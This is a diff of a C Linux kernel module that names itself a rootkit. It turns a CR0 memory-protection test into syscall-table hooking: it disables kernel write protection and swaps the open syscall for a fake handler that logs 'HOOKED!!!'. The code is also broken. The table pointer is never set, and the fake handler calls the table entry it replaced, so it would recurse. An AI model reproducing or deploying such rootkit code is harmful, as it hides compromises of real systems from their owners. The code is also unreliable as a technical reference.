@@ -2,12 +2,17 @@
 #include <linux/kernel.h>
 #include <linux/init.h>
 #include <linux/syscalls.h>
-#include <asm/unistd.h>
 #include <linux/sched.h>
 #include <linux/dirent.h>
 #include <linux/slab.h>
 #include <linux/version.h>
+#include <linux/kallsyms.h>
 #include <asm/paravirt.h>
+#include <asm-generic/unistd.h>
+
+static unsigned long *sys_call_table;
+static unsigned long orig_sys_call_table[__NR_syscalls] = { 0 };
+extern unsigned long __force_order;
 
 static inline void write_cr0_forced(unsigned long val)
 {
@@ -24,37 +29,43 @@ static inline void protect_memory(void)
     write_cr0_forced(read_cr0() | X86_CR0_WP);
 }
 
-static void test_memory_protection(void)
+static void hook_syscall(unsigned int syscall_num, unsigned long hook)
 {
-    unsigned long cr0;
-    printk(KERN_INFO "Loading Tzel.\n");
-
-    cr0 = read_cr0();
-    printk(KERN_INFO "cr0: %lx\n", cr0);
-
-    printk(KERN_INFO "Unprotecting...\n");
     unprotect_memory();
-
-    cr0 = read_cr0();
-    printk(KERN_INFO "cr0: %lx\n", cr0);
-
-    printk(KERN_INFO "Protecting...\n");
+    orig_sys_call_table[syscall_num] = sys_call_table[syscall_num];
+    sys_call_table[syscall_num] = hook;
     protect_memory();
+}
 
-    cr0 = read_cr0();
-    printk(KERN_INFO "cr0: %lx\n", cr0);
+static void unhook_all(void)
+{
+    int i;
+
+    unprotect_memory();
+    for (i = 0; i < __NR_syscalls; i++)
+        if (orig_sys_call_table[i]) 
+            sys_call_table[i] = orig_sys_call_table[i];
+    protect_memory();
+}
+
+asmlinkage long sys_open_fake(unsigned int fd)
+{
+    long (*orig_open)(unsigned int) = (long (*)(unsigned int))(sys_call_table[__NR_open]);
+    printk(KERN_INFO "HOOKED!!!");
+    
+    return orig_open(fd);
 }
 
 static int __init init_rootkit(void)
 {
-    test_memory_protection();
+    hook_syscall(__NR_open, (unsigned long)sys_open_fake);
 
     return 0;
 }
 
 static void __exit cleanup_rootkit(void)
 {
-    
+    unhook_all();
 }  
 
 module_init(init_rootkit);
